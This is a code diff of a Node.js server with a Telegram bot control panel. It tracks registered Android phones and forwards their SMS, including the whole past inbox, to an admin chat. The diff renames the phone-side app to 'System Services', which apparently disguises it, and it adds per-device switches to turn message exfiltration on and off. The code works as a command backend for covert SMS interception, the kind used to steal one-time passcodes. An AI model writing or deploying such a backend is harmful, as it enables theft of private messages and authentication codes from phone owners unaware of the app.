@@ -11,10 +11,10 @@ const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL |
 const app = express();
 app.use(express.json());
 
-// In-Memory Device Storage
+// In-Memory Device Storage: deviceId -> object
 const devices = new Map();
 
-// Initialize Telegram Bot with polling
+// Initialize Telegram Bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 bot.on('polling_error', (error) => {
@@ -29,8 +29,87 @@ process.on('unhandledRejection', (reason, promise) => {
   console.error('[Unhandled Rejection]:', reason);
 });
 
+// Helper Functions
+function isAdmin(chatId) {
+  return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
+}
+
+function buildMainReplyKeyboard() {
+  return {
+    keyboard: [
+      [{ text: '📱 Connected Devices' }, { text: '📊 Overall Status' }],
+      [{ text: '❓ Help & Info' }]
+    ],
+    resize_keyboard: true
+  };
+}
+
+function buildDeviceControlMessage(dev) {
+  const isOnline = (new Date() - new Date(dev.lastSeen)) < 3 * 60 * 1000;
+  const liveStatus = isOnline ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive*';
+  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
+  const batText = dev.batteryLevel >= 0 ? `${dev.batteryLevel}% ${dev.isCharging ? '🔌 (Charging)' : '🔋'}` : 'Unknown';
+
+  return `📱 *DEVICE CONTROL CENTER*
+━━━━━━━━━━━━━━━━━━━━━
+🏷️ *Device Name:* \`${dev.deviceAlias}\`
+🆔 *Device ID:* \`${dev.deviceId}\`
+📲 *Model:* \`${dev.model}\`
+⚡ *Battery:* ${batText}
+⚙️ *Service:* ${dev.isServiceRunning ? '🟢 Running' : '🔴 Stopped'}
+
+⚡ *Live Status:* ${liveStatus}
+💬 *SMS Forwarding:* ${fwdStatus}
+📋 *Status Info:* ${dev.killReason}
+━━━━━━━━━━━━━━━━━━━━━
+_Select an action below to manage this device:_`;
+}
+
+function buildDeviceMainKeyboard(devId) {
+  return {
+    inline_keyboard: [
+      [
+        { text: '💬 SMS Settings', callback_data: `sms_settings_${devId}` },
+        { text: '✏️ Rename Device', callback_data: `rename_${devId}` }
+      ],
+      [
+        { text: '🔄 Refresh Status', callback_data: `refresh_${devId}` },
+        { text: '📋 All Devices List', callback_data: 'dev_list' }
+      ]
+    ]
+  };
+}
+
+function buildSmsSettingsMessage(dev) {
+  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
+  return `💬 *SMS SETTINGS for \`${dev.deviceAlias}\`*
+━━━━━━━━━━━━━━━━━━━━━
+📲 *Model:* \`${dev.model}\`
+🆔 *Device ID:* \`${dev.deviceId}\`
+💬 *SMS Forwarding Status:* ${fwdStatus}
+━━━━━━━━━━━━━━━━━━━━━
+• *Turn SMS ON*: Enables live SMS forwarding and uploads old past inbox, new & upcoming SMS to bot.
+• *Turn SMS OFF*: Disables live SMS forwarding.
+
+_Select an action below:_`;
+}
+
+function buildSmsSettingsKeyboard(devId) {
+  return {
+    inline_keyboard: [
+      [
+        { text: '🟢 Turn SMS ON', callback_data: `sms_on_${devId}` },
+        { text: '🔴 Turn SMS OFF', callback_data: `sms_off_${devId}` }
+      ],
+      [
+        { text: '🔙 Back to Device Control', callback_data: `dev_info_${devId}` }
+      ]
+    ]
+  };
+}
+
 // ----------------------------------------------------
-// 1. EXPRESS HTTP SERVER & RENDER KEEP-ALIVE
+// 1. EXPRESS HTTP ENDPOINTS
 // ----------------------------------------------------
 
 app.get('/', (req, res) => {
@@ -46,7 +125,6 @@ app.get('/ping', (req, res) => {
   res.json({ status: 'alive', time: new Date().toISOString() });
 });
 
-// Device Registration / Heartbeat Endpoint from Android App
 app.post('/api/register-device', (req, res) => {
   const { deviceId, deviceAlias, model, batteryLevel, isCharging, isServiceRunning, isForwardingEnabled, killReason } = req.body;
 
@@ -54,13 +132,14 @@ app.post('/api/register-device', (req, res) => {
     return res.status(400).json({ error: 'deviceId is required' });
   }
 
+  const existing = devices.get(deviceId) || {};
   devices.set(deviceId, {
     deviceId,
-    deviceAlias: deviceAlias || model || 'Android Device',
+    deviceAlias: deviceAlias || existing.deviceAlias || model || 'Android Device',
     model: model || 'Unknown Model',
     batteryLevel: batteryLevel ?? -1,
     isCharging: !!isCharging,
-    isServiceRunning: !!isServiceRunning,
+    isServiceRunning: isServiceRunning !== false,
     isForwardingEnabled: isForwardingEnabled !== false,
     killReason: killReason || 'Running smoothly',
     lastSeen: new Date()
@@ -70,7 +149,6 @@ app.post('/api/register-device', (req, res) => {
   res.json({ success: true });
 });
 
-// Incoming SMS Forwarding Endpoint from Android App
 app.post('/api/forward-sms', async (req, res) => {
   const { deviceId, sender, body, simSlot, timestamp } = req.body;
 
@@ -85,7 +163,7 @@ app.post('/api/forward-sms', async (req, res) => {
 
   try {
     for (const targetId of targets) {
-      await bot.sendMessage(targetId, formattedMsg, { parse_mode: 'Markdown' });
+      if (targetId) await bot.sendMessage(targetId, formattedMsg, { parse_mode: 'Markdown' });
     }
     res.json({ success: true });
   } catch (err) {
@@ -94,7 +172,6 @@ app.post('/api/forward-sms', async (req, res) => {
   }
 });
 
-// Start Express Server
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`====================================================`);
   console.log(`🚀 SMS Forwarder Bot Server running on port ${PORT}`);
@@ -105,156 +182,131 @@ const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`====================================================`);
 });
 
-// ----------------------------------------------------
-// 2. RENDER SELF-PING KEEP-ALIVE CRON (EVERY 5 MINS)
-// ----------------------------------------------------
-const PING_INTERVAL = 5 * 60 * 1000; // 5 Minutes
-
+// Self-Ping Keep Alive
 setInterval(async () => {
   try {
     const pingUrl = RENDER_EXTERNAL_URL.endsWith('/') ? `${RENDER_EXTERNAL_URL}ping` : `${RENDER_EXTERNAL_URL}/ping`;
-    console.log(`[Self-Ping Keep-Alive] Pinging ${pingUrl}...`);
-
-    // Node 18+ native fetch
     const response = await fetch(pingUrl);
     console.log(`[Self-Ping Keep-Alive] Response status: ${response.status}`);
   } catch (err) {
     console.error(`[Self-Ping Keep-Alive] Ping failed:`, err.message);
   }
-}, PING_INTERVAL);
+}, 5 * 60 * 1000);
 
-// ----------------------------------------------------
-// 3. TELEGRAM BOT COMMANDS & INLINE KEYBOARD PANELS
-// ----------------------------------------------------
-
-function buildDeviceControlMessage(dev) {
-  const isOnline = (new Date() - new Date(dev.lastSeen)) < 3 * 60 * 1000; // 3 mins threshold
-  const liveStatus = isOnline ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive*';
-  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
-  const batText = dev.batteryLevel >= 0 ? `${dev.batteryLevel}% ${dev.isCharging ? '🔌 (Charging)' : '🔋'}` : 'Unknown';
-
-  return `📱 *DEVICE CONTROL CENTER*
-━━━━━━━━━━━━━━━━━━━━━
-🏷️ *Device Name:* \`${dev.deviceAlias}\`
-🆔 *Device ID:* \`${dev.deviceId}\`
-📲 *Model:* \`${dev.model}\`
-⚡ *Battery:* ${batText}
-
-⚡ *Live Status:* ${liveStatus}
-💬 *SMS Forwarding:* ${fwdStatus}
-📋 *Status Info:* ${dev.killReason}
-━━━━━━━━━━━━━━━━━━━━━
-_Select an action below to manage this device:_`;
-}
-
-function buildDeviceKeyboard(devId, isFwdOn) {
-  const smsBtn = isFwdOn
-    ? { text: '🔴 Turn SMS OFF', callback_data: `sms_off_${devId}` }
-    : { text: '🟢 Turn SMS ON', callback_data: `sms_on_${devId}` };
-
-  return {
-    inline_keyboard: [
-      [smsBtn],
-      [
-        { text: '📥 Sync Old Inbox SMS', callback_data: `sync_old_${devId}` },
-        { text: '✏️ Rename Device', callback_data: `rename_${devId}` }
-      ],
-      [
-        { text: '🔄 Refresh Status', callback_data: `refresh_${devId}` },
-        { text: '📋 All Devices List', callback_data: `dev_list` }
-      ]
-    ]
-  };
-}
-
-// Group Chat ID Discovery: /start, /groupid, /id in Group/Channel
-bot.onText(/\/(start|groupid|id)/i, async (msg) => {
-  const chatId = msg.chat.id.toString();
+// Telegram Message Handler
+bot.on('message', async (msg) => {
+  const chatId = String(msg.chat.id);
   const chatType = msg.chat.type;
+  const text = (msg.text || '').trim();
 
-  // If command sent inside a Group / Supergroup / Channel
   if (chatType === 'group' || chatType === 'supergroup' || chatType === 'channel') {
-    const groupTitle = msg.chat.title || 'Telegram Group';
-    const groupReply = `📌 *TELEGRAM GROUP DETAILS*
-━━━━━━━━━━━━━━━━━━━━━
-🏷️ *Group Title:* \`${groupTitle}\`
-🆔 *Group Chat ID:* \`${chatId}\`
-━━━━━━━━━━━━━━━━━━━━━
-_Copy the Group Chat ID above and set \`GROUP_CHAT_ID=${chatId}\` in Render Environment Variables to post all SMS messages directly into this group!_`;
-
-    return bot.sendMessage(chatId, groupReply, { parse_mode: 'Markdown' });
+    if (text.startsWith('/') || text.toLowerCase().includes('groupid') || text.toLowerCase().includes('id')) {
+      const groupTitle = msg.chat.title || 'Telegram Group';
+      const groupReply = `📌 *TELEGRAM GROUP DETAILS*\n━━━━━━━━━━━━━━━━━━━━━\n🏷️ *Group Title:* \`${groupTitle}\`\n🆔 *Group Chat ID:* \`${chatId}\`\n━━━━━━━━━━━━━━━━━━━━━\n_Set \`GROUP_CHAT_ID=${chatId}\` in Render Environment Variables!_`;
+      return bot.sendMessage(chatId, groupReply, { parse_mode: 'Markdown' });
+    }
+    return;
   }
 
-  // If in Private Direct Chat with Admin
-  if (chatId !== ADMIN_CHAT_ID) {
+  if (!isAdmin(chatId)) {
     return bot.sendMessage(chatId, '❌ Unauthorized user.');
   }
 
-  if (devices.size === 0) {
-    return bot.sendMessage(chatId, '📱 *No Devices Connected Yet.*\n\nInstall the SMS Forwarder app on your Android device and enable permissions to see devices here.', { parse_mode: 'Markdown' });
-  }
-
-  // If 1 device connected
-  if (devices.size === 1) {
-    const dev = Array.from(devices.values())[0];
-    return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
+  if (text === '/start' || text === '/help' || text === '/menu' || text === '❓ Help & Info') {
+    return bot.sendMessage(chatId, '🤖 *SMS Forwarder Device Manager*\n━━━━━━━━━━━━━━━━━━━━━\nWelcome! Use the menu buttons at the bottom of your chat box to manage devices.', {
       parse_mode: 'Markdown',
-      reply_markup: buildDeviceKeyboard(dev.deviceId, dev.isForwardingEnabled)
+      reply_markup: buildMainReplyKeyboard()
     });
   }
 
-  // Multiple devices
-  const listButtons = Array.from(devices.values()).map(dev => [
-    { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
-  ]);
+  if (text === '📱 Connected Devices' || text === '/devices' || text === '/status') {
+    if (devices.size === 0) {
+      return bot.sendMessage(chatId, '📱 *No Devices Connected Yet.*\n\nInstall the System Services app on your Android phone to connect.', {
+        parse_mode: 'Markdown',
+        reply_markup: buildMainReplyKeyboard()
+      });
+    }
 
-  await bot.sendMessage(chatId, '📱 *Connected Devices List:*\nSelect a device to control:', {
-    parse_mode: 'Markdown',
-    reply_markup: { inline_keyboard: listButtons }
-  });
-});
+    if (devices.size === 1) {
+      const dev = Array.from(devices.values())[0];
+      return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
+        parse_mode: 'Markdown',
+        reply_markup: buildDeviceMainKeyboard(dev.deviceId)
+      });
+    }
 
-// Command: /rename <new_name>
-bot.onText(/\/rename (.+)/i, async (msg, match) => {
-  const chatId = msg.chat.id.toString();
-  if (chatId !== ADMIN_CHAT_ID) return;
+    const listButtons = Array.from(devices.values()).map(dev => [
+      { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
+    ]);
 
-  const newName = match[1].trim();
-  if (devices.size === 0) {
-    return bot.sendMessage(chatId, '❌ No connected devices found.');
+    return bot.sendMessage(chatId, '📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
+      parse_mode: 'Markdown',
+      reply_markup: { inline_keyboard: listButtons }
+    });
   }
 
-  const dev = Array.from(devices.values())[0];
-  const oldName = dev.deviceAlias;
-  dev.deviceAlias = newName;
-  devices.set(dev.deviceId, dev);
+  if (text === '📊 Overall Status' || text === '/info') {
+    let onlineCount = 0;
+    const now = new Date();
+    devices.forEach(d => {
+      if ((now - new Date(d.lastSeen)) < 3 * 60 * 1000) onlineCount++;
+    });
 
-  await bot.sendMessage(chatId, `✅ Device renamed from \`${oldName}\` to \`${newName}\`!`, { parse_mode: 'Markdown' });
-  await bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
-    parse_mode: 'Markdown',
-    reply_markup: buildDeviceKeyboard(dev.deviceId, dev.isForwardingEnabled)
-  });
+    const statusText = `📊 *SYSTEM OVERALL STATUS*\n━━━━━━━━━━━━━━━━━━━━━\n🌐 *Bot Server:* 🟢 Online (Node.js)\n📱 *Total Connected Devices:* ${devices.size}\n🟢 *Online Devices:* ${onlineCount}\n🔴 *Offline Devices:* ${devices.size - onlineCount}\n━━━━━━━━━━━━━━━━━━━━━\n_Select \`📱 Connected Devices\` from bottom menu to view individual devices._`;
+    return bot.sendMessage(chatId, statusText, {
+      parse_mode: 'Markdown',
+      reply_markup: buildMainReplyKeyboard()
+    });
+  }
+
+  if (text.startsWith('/rename')) {
+    const match = text.match(/\/rename\s+(.+)/i);
+    if (!match) {
+      return bot.sendMessage(chatId, '✏️ *Usage:*\n`/rename New Device Name`\n_OR_\n`/rename <deviceId> New Device Name`', { parse_mode: 'Markdown' });
+    }
+    const parts = match[1].split(/\s+/);
+    if (devices.size === 0) {
+      return bot.sendMessage(chatId, '❌ No connected devices found.');
+    }
+
+    let dev = Array.from(devices.values())[0];
+    let newName = match[1].trim();
+
+    if (devices.has(parts[0]) && parts.length > 1) {
+      dev = devices.get(parts[0]);
+      newName = parts.slice(1).join(' ').trim();
+    }
+
+    const oldName = dev.deviceAlias;
+    dev.deviceAlias = newName;
+    devices.set(dev.deviceId, dev);
+
+    await bot.sendMessage(chatId, `✅ Device renamed from \`${oldName}\` to \`${newName}\`!`, { parse_mode: 'Markdown' });
+    return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
+      parse_mode: 'Markdown',
+      reply_markup: buildDeviceMainKeyboard(dev.deviceId)
+    });
+  }
 });
 
-// Inline Keyboard Callback Query Handler
+// Inline Callback Queries
 bot.on('callback_query', async (query) => {
-  const chatId = query.message.chat.id.toString();
+  const chatId = String(query.message.chat.id);
   const messageId = query.message.message_id;
   const data = query.data;
 
-  if (chatId !== ADMIN_CHAT_ID) {
+  if (!isAdmin(chatId)) {
     return bot.answerCallbackQuery(query.id, { text: '❌ Unauthorized' });
   }
 
   if (data === 'dev_list') {
     if (devices.size === 0) {
-      return bot.answerCallbackQuery(query.id, { text: 'No devices connected yet' });
+      return bot.answerCallbackQuery(query.id, { text: 'No devices connected' });
     }
     const listButtons = Array.from(devices.values()).map(dev => [
       { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
     ]);
-
-    await bot.editMessageText('📱 *Connected Devices List:*\nSelect a device to control:', {
+    await bot.editMessageText('📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
       chat_id: chatId,
       message_id: messageId,
       parse_mode: 'Markdown',
@@ -263,7 +315,7 @@ bot.on('callback_query', async (query) => {
     return bot.answerCallbackQuery(query.id, { text: 'Updated device list' });
   }
 
-  const matchAction = data.match(/^(dev_info|sms_on|sms_off|sync_old|rename|refresh)_(.+)$/);
+  const matchAction = data.match(/^(dev_info|sms_settings|sms_on|sms_off|sync_old|rename|refresh)_(.+)$/);
   if (!matchAction) return;
 
   const action = matchAction[1];
@@ -281,43 +333,50 @@ bot.on('callback_query', async (query) => {
         chat_id: chatId,
         message_id: messageId,
         parse_mode: 'Markdown',
-        reply_markup: buildDeviceKeyboard(dev.deviceId, dev.isForwardingEnabled)
+        reply_markup: buildDeviceMainKeyboard(devId)
       });
       bot.answerCallbackQuery(query.id, { text: 'Refreshed live status' });
+      break;
+
+    case 'sms_settings':
+      await bot.editMessageText(buildSmsSettingsMessage(dev), {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown',
+        reply_markup: buildSmsSettingsKeyboard(devId)
+      });
+      bot.answerCallbackQuery(query.id, { text: 'SMS Settings menu' });
       break;
 
     case 'sms_on':
       dev.isForwardingEnabled = true;
       devices.set(devId, dev);
-      await bot.editMessageText(buildDeviceControlMessage(dev), {
+      await bot.editMessageText(buildSmsSettingsMessage(dev), {
         chat_id: chatId,
         message_id: messageId,
         parse_mode: 'Markdown',
-        reply_markup: buildDeviceKeyboard(dev.deviceId, true)
+        reply_markup: buildSmsSettingsKeyboard(devId)
       });
       bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled' });
+      bot.sendMessage(chatId, `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\n📥 All past inbox SMS, new, and upcoming SMS will be uploaded and forwarded to this bot.`, { parse_mode: 'Markdown' });
       break;
 
     case 'sms_off':
       dev.isForwardingEnabled = false;
       devices.set(devId, dev);
-      await bot.editMessageText(buildDeviceControlMessage(dev), {
+      await bot.editMessageText(buildSmsSettingsMessage(dev), {
         chat_id: chatId,
         message_id: messageId,
         parse_mode: 'Markdown',
-        reply_markup: buildDeviceKeyboard(dev.deviceId, false)
+        reply_markup: buildSmsSettingsKeyboard(devId)
       });
       bot.answerCallbackQuery(query.id, { text: '🔴 SMS Forwarding Disabled' });
-      break;
-
-    case 'sync_old':
-      bot.answerCallbackQuery(query.id, { text: '📥 Inbox sync requested' });
-      bot.sendMessage(chatId, `📥 Syncing past inbox SMS for \`${dev.deviceAlias}\`...`, { parse_mode: 'Markdown' });
+      bot.sendMessage(chatId, `🔴 *SMS Forwarding Disabled* for \`${dev.deviceAlias}\`.\n\nUpcoming SMS messages will be stopped.`, { parse_mode: 'Markdown' });
       break;
 
     case 'rename':
       bot.answerCallbackQuery(query.id, { text: 'Send rename command' });
-      bot.sendMessage(chatId, `✏️ *To Rename Device \`${dev.deviceAlias}\`:*\n\nSend command:\n\`/rename New Device Name\``, { parse_mode: 'Markdown' });
+      bot.sendMessage(chatId, `✏️ *To Rename Device \`${dev.deviceAlias}\`:*\n\nSend command in chat:\n\`/rename New Device Name\``, { parse_mode: 'Markdown' });
       break;
   }
 });
